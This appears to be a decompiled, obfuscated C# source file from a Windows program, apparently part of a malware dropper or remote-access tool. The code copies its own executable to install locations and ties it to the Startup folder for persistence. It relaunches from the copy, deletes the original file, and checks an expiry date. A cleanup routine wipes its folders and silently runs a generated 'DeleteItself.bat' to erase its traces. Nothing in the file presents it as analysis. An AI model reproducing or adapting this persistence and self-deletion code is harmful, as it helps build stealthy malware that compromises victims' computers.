using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal static class Class6
{
	[CompilerGenerated]
	private sealed class Class7
	{
		public string string_0;

		internal bool method_0(Process process_0)
		{
			return process_0.MainModule!.FileName!.StartsWith(string_0);
		}
	}

	internal static void smethod_0(Class2.Enum0 enum0_0, string string_0)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		if (enum0_0 == Class2.Enum0.const_0)
		{
			MessageBox.Show(Class4.StartModeDebug);
			return;
		}
		if (string_0 != null)
		{
			if (enum0_0 == Class2.Enum0.const_3)
			{
				string_0 = string_0.Replace("?", " ");
				if (Path.IsPathRooted(string_0) && File.Exists(string_0))
				{
					int num = 0;
					bool flag;
					do
					{
						string? fileNameWithoutExtension = Path.GetFileNameWithoutExtension(string_0);
						string string_ = Directory.GetParent(string_0)!.ToString();
						flag = Process.GetProcessesByName(fileNameWithoutExtension).FirstOrDefault((Process process_0) => process_0.MainModule!.FileName!.StartsWith(string_)) != null;
						Thread.Sleep(100);
						num++;
					}
					while (flag && num < 100);
					Thread.Sleep(300);
					if (!flag)
					{
						File.Delete(string_0);
					}
				}
			}
			if (enum0_0 == Class2.Enum0.const_1)
			{
				MessageBox.Show(Class2.string_5, Class2.string_6, (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			if (Class2.bool_0)
			{
				Environment.Exit(0);
			}
			return;
		}
		string string_2 = Class2.string_8;
		if (Class2.string_9 != null)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Class2.string_9));
			Class11.smethod_0(Class2.enum1_0);
			if (Application.get_ExecutablePath() == Class2.string_10 || Application.get_ExecutablePath() == text)
			{
				return;
			}
		}
		if (smethod_1(Class2.string_10, bool_0: true))
		{
			smethod_1(string_2, bool_0: true);
		}
		string arguments = Application.get_ExecutablePath().Replace(" ", "?");
		Process.Start(string_2, arguments);
		Environment.Exit(0);
	}

	internal static bool smethod_1(string string_0, bool bool_0)
	{
		if (Application.get_ExecutablePath() == string_0)
		{
			return false;
		}
		Directory.CreateDirectory(Directory.GetParent(string_0)!.ToString());
		File.Copy(Application.get_ExecutablePath(), string_0, bool_0);
		return true;
	}

	internal static bool smethod_2()
	{
		return DateTime.Now > Class2.dateTime_0;
	}

	internal static void smethod_3()
	{
		if (Class2.enum0_0 == Class2.Enum0.const_0)
		{
			Environment.Exit(0);
		}
		try
		{
			Class11.smethod_3(Class2.string_10);
			foreach (string item in new HashSet<string>
			{
				Path.GetDirectoryName(Class2.string_10),
				Path.GetDirectoryName(Class2.string_8),
				Class2.string_12
			})
			{
				try
				{
					if (Directory.Exists(item))
					{
						Directory.Delete(item, recursive: true);
					}
				}
				catch (Exception)
				{
				}
			}
			string text = Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\DeleteItself.bat";
			using (StreamWriter streamWriter = new StreamWriter(text, append: false, Encoding.Default))
			{
				streamWriter.Write(":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", Application.get_ExecutablePath());
			}
			WinExec(text, 0u);
		}
		finally
		{
			Environment.Exit(0);
		}
	}

	[DllImport("kernel32.dll")]
	public static extern uint WinExec(string string_0, uint uint_0);
}
